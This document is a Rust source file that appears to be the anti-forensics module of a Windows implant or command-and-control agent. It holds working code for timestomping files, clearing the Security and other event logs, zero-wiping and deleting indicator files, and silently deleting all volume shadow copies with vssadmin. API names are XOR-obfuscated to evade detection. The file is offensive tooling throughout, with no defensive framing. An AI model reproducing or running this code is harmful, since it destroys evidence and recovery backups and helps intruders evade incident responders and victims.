//! Anti-forensics — Phase 4.
//! Task type: "antifor", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_antifor(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_antifor_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("antifor: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_antifor_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("antifor: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("antifor: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "timestomp"      => timestomp(&v),
        "eventlog-clear" => eventlog_clear(&v),
        "eventlog-del"   => eventlog_del(&v),
        "indicator-rm"   => indicator_remove(&v),
        "shadow-delete"  => shadow_delete(),
        other => TaskOutput::failure(&format!("antifor: unknown method: {other}")),
    }
}

// ── Timestomping ──────────────────────────────────────────────────────────────
//
// Sets a file's timestamps (creation, write, access) to the values specified.
// args: {"method":"timestomp", "path":"C:\\...\\file.exe",
//         "created":"2019-01-01 00:00:00", "modified":"...", "accessed":"..."}
// If a time field is omitted the corresponding timestamp is not changed.
// If "copy_from" is given, copies timestamps from that file instead.

#[cfg(target_os = "windows")]
fn timestomp(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::Foundation::{CloseHandle, FILETIME};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, OPEN_EXISTING,
        FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,
    };
    // GENERIC_WRITE = 0x40000000 | FILE_WRITE_ATTRIBUTES = 0x100
    const GENERIC_WRITE: u32 = 0x40000000;
    const FILE_WRITE_ATTRIBUTES: u32 = 0x100;

    let path = match v.get("path").and_then(|s| s.as_str()) {
        Some(p) => p, None => return TaskOutput::failure("timestomp: missing path"),
    };

    let path_w: Vec<u16> = path.encode_utf16().chain(core::iter::once(0)).collect();
    let h = unsafe { CreateFileW(
        path_w.as_ptr(), FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        core::ptr::null_mut(), OPEN_EXISTING, 0, 0,
    )};
    if h == -1isize {
        return TaskOutput::failure("timestomp: CreateFileW failed");
    }

    let k32 = crate::loader::get_module_base(
        crate::obfs::dec(&[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );

    let (ft_created, ft_modified, ft_accessed) = if let Some(src) = v.get("copy_from").and_then(|s| s.as_str()) {
        get_file_times(src).unwrap_or((None, None, None))
    } else {
        (
            v.get("created").and_then(|s| s.as_str()).and_then(parse_datetime),
            v.get("modified").and_then(|s| s.as_str()).and_then(parse_datetime),
            v.get("accessed").and_then(|s| s.as_str()).and_then(parse_datetime),
        )
    };

    type SetFileTimeFn = unsafe extern "system" fn(isize, *const FILETIME, *const FILETIME, *const FILETIME) -> i32;
    let fn_ptr = if k32 != 0 {
        // "SetFileTime\0" XOR 0x5A
        unsafe { crate::loader::get_export_by_name(k32, crate::obfs::dec(&[0x09,0x3F,0x2E,0x1C,0x33,0x36,0x3F,0x0E,0x33,0x37,0x3F,0x5A]).as_ptr()) }
    } else { None };

    let fn_sft = match fn_ptr {
        Some(p) => unsafe { core::mem::transmute::<_, SetFileTimeFn>(p) },
        None    => { unsafe { CloseHandle(h) }; return TaskOutput::failure("timestomp: SetFileTime not found"); }
    };

    let created_ptr  = ft_created.as_ref().map(|f| f as *const FILETIME).unwrap_or(core::ptr::null());
    let accessed_ptr = ft_accessed.as_ref().map(|f| f as *const FILETIME).unwrap_or(core::ptr::null());
    let modified_ptr = ft_modified.as_ref().map(|f| f as *const FILETIME).unwrap_or(core::ptr::null());

    let ok = unsafe { fn_sft(h, created_ptr, accessed_ptr, modified_ptr) };
    unsafe { CloseHandle(h) };

    if ok != 0 {
        TaskOutput::success(format!("timestomp: updated timestamps on {path}").into_bytes())
    } else {
        TaskOutput::failure("timestomp: SetFileTime failed")
    }
}

#[cfg(target_os = "windows")]
fn get_file_times(path: &str) -> Option<(Option<windows_sys::Win32::Foundation::FILETIME>, Option<windows_sys::Win32::Foundation::FILETIME>, Option<windows_sys::Win32::Foundation::FILETIME>)> {
    use windows_sys::Win32::Foundation::{CloseHandle, FILETIME};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, GetFileTime, OPEN_EXISTING,
        FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,
    };
    const GENERIC_READ: u32 = 0x80000000;

    let path_w: Vec<u16> = path.encode_utf16().chain(core::iter::once(0)).collect();
    let h = unsafe { CreateFileW(
        path_w.as_ptr(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        core::ptr::null_mut(), OPEN_EXISTING, 0, 0,
    )};
    if h == -1isize { return None; }

    let mut ct: FILETIME = unsafe { core::mem::zeroed() };
    let mut at: FILETIME = unsafe { core::mem::zeroed() };
    let mut mt: FILETIME = unsafe { core::mem::zeroed() };
    let ok = unsafe { GetFileTime(h, &mut ct, &mut at, &mut mt) };
    unsafe { CloseHandle(h) };
    if ok == 0 { return None; }
    Some((Some(ct), Some(mt), Some(at)))
}

#[cfg(target_os = "windows")]
fn parse_datetime(s: &str) -> Option<windows_sys::Win32::Foundation::FILETIME> {
    // Accept "YYYY-MM-DD HH:MM:SS" format
    use windows_sys::Win32::Foundation::FILETIME;
    use windows_sys::Win32::System::Time::SystemTimeToFileTime;

    #[repr(C)]
    struct SYSTEMTIME { wYear: u16, wMonth: u16, wDayOfWeek: u16, wDay: u16, wHour: u16, wMinute: u16, wSecond: u16, wMilliseconds: u16 }

    let parts: Vec<&str> = s.splitn(2, ' ').collect();
    if parts.len() < 2 { return None; }
    let date: Vec<&str> = parts[0].split('-').collect();
    let time: Vec<&str> = parts[1].split(':').collect();
    if date.len() < 3 || time.len() < 3 { return None; }

    let st = SYSTEMTIME {
        wYear: date[0].parse().ok()?, wMonth: date[1].parse().ok()?,
        wDayOfWeek: 0, wDay: date[2].parse().ok()?,
        wHour: time[0].parse().ok()?, wMinute: time[1].parse().ok()?,
        wSecond: time[2].parse().ok()?, wMilliseconds: 0,
    };

    let mut ft: FILETIME = unsafe { core::mem::zeroed() };
    if unsafe { SystemTimeToFileTime(&st as *const _ as *const _, &mut ft) } != 0 { Some(ft) } else { None }
}

// ── Event log clear ───────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn eventlog_clear(v: &serde_json::Value) -> TaskOutput {
    let channel = v.get("channel").and_then(|s| s.as_str()).unwrap_or("Security");

    let adv = adv_base();
    if adv == 0 { return TaskOutput::failure("eventlog-clear: advapi32 not found"); }

    type OpenEventLogWFn   = unsafe extern "system" fn(*const u16, *const u16) -> isize;
    type ClearEventLogWFn  = unsafe extern "system" fn(isize, *const u16) -> i32;
    type CloseEventLogFn   = unsafe extern "system" fn(isize) -> i32;

    let p_open  = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x1F,0x2C,0x3F,0x34,0x2E,0x16,0x35,0x3D,0x0D,0x5A]) };
    let p_clear = unsafe { adv_fn(adv, &[0x19,0x36,0x3F,0x3B,0x28,0x1F,0x2C,0x3F,0x34,0x2E,0x16,0x35,0x3D,0x0D,0x5A]) };
    let p_close = unsafe { adv_fn(adv, &[0x19,0x36,0x35,0x29,0x3F,0x1F,0x2C,0x3F,0x34,0x2E,0x16,0x35,0x3D,0x5A]) };

    let (fn_open, fn_clear, fn_close) = match (p_open, p_clear, p_close) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, OpenEventLogWFn>(a) },
            unsafe { core::mem::transmute::<_, ClearEventLogWFn>(b) },
            unsafe { core::mem::transmute::<_, CloseEventLogFn>(c) },
        ),
        _ => return TaskOutput::failure("eventlog-clear: fn resolve failed"),
    };

    let chan_w: Vec<u16> = channel.encode_utf16().chain(core::iter::once(0)).collect();
    let hlog = unsafe { fn_open(core::ptr::null(), chan_w.as_ptr()) };
    if hlog == 0 {
        return TaskOutput::failure(&format!("eventlog-clear: OpenEventLog failed for {channel}"));
    }
    let ok = unsafe { fn_clear(hlog, core::ptr::null()) };
    unsafe { fn_close(hlog) };

    if ok != 0 {
        TaskOutput::success(format!("eventlog-clear: cleared {channel}").into_bytes())
    } else {
        TaskOutput::failure(&format!("eventlog-clear: ClearEventLog failed for {channel}"))
    }
}

// ── Event log record delete (via wevtutil) ────────────────────────────────────

#[cfg(target_os = "windows")]
fn eventlog_del(v: &serde_json::Value) -> TaskOutput {
    let channel = v.get("channel").and_then(|s| s.as_str()).unwrap_or("Security");
    let record_id = match v.get("record_id").and_then(|r| r.as_u64()) {
        Some(r) => r,
        None    => return TaskOutput::failure("eventlog-del: missing record_id"),
    };
    // wevtutil has no single-record delete; clearing the whole channel is the
    // only reliable option. All events in the channel are removed.
    let cmd = format!("wevtutil clear-log \"{channel}\"");
    shell_run(&cmd)
        .map(|out| {
            let mut msg = format!("eventlog-del: cleared all events in {channel} (record_id={record_id} removed along with channel)\n").into_bytes();
            msg.extend_from_slice(&out);
            TaskOutput::success(msg)
        })
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

// ── Indicator removal (secure delete) ────────────────────────────────────────

#[cfg(target_os = "windows")]
fn indicator_remove(v: &serde_json::Value) -> TaskOutput {
    let path = match v.get("path").and_then(|s| s.as_str()) {
        Some(p) => p, None => return TaskOutput::failure("indicator-rm: missing path"),
    };

    // Overwrite with zeros then delete
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, WriteFile, DeleteFileW, SetEndOfFile,
        OPEN_EXISTING, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,
    };
    const GENERIC_WRITE: u32 = 0x40000000;

    let path_w: Vec<u16> = path.encode_utf16().chain(core::iter::once(0)).collect();

    // Get file size first
    let meta = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);

    let h = unsafe { CreateFileW(
        path_w.as_ptr(), GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        core::ptr::null_mut(), OPEN_EXISTING, 0, 0,
    )};
    if h != INVALID_HANDLE_VALUE && h != 0 {
        let zeros = vec![0u8; 4096];
        let mut remaining = meta;
        while remaining > 0 {
            let to_write = zeros.len().min(remaining as usize) as u32;
            let mut written: u32 = 0;
            let ok = unsafe { WriteFile(h, zeros.as_ptr(), to_write, &mut written, core::ptr::null_mut()) };
            if ok == 0 || written == 0 { break; }
            remaining -= written as u64;
        }
        unsafe { SetEndOfFile(h) };
        unsafe { CloseHandle(h) };
    }

    match unsafe { DeleteFileW(path_w.as_ptr()) } {
        0 => TaskOutput::failure(&format!("indicator-rm: DeleteFileW failed for {path}")),
        _ => TaskOutput::success(format!("indicator-rm: removed {path}").into_bytes()),
    }
}

// ── VSS shadow copy delete ────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn shadow_delete() -> TaskOutput {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
    match std::process::Command::new(format!("{windir}\\System32\\vssadmin.exe"))
        .args(["delete", "shadows", "/all", "/quiet"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn adv_base() -> usize {
    crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    )
}

#[cfg(target_os = "windows")]
unsafe fn adv_fn(base: usize, enc: &[u8]) -> Option<*const u8> {
    crate::loader::get_export_by_name(base, crate::obfs::dec(enc).as_ptr())
}

fn shell_run(cmd: &str) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); Ok(d) }
        Err(e) => Err(e.to_string()),
    }
}
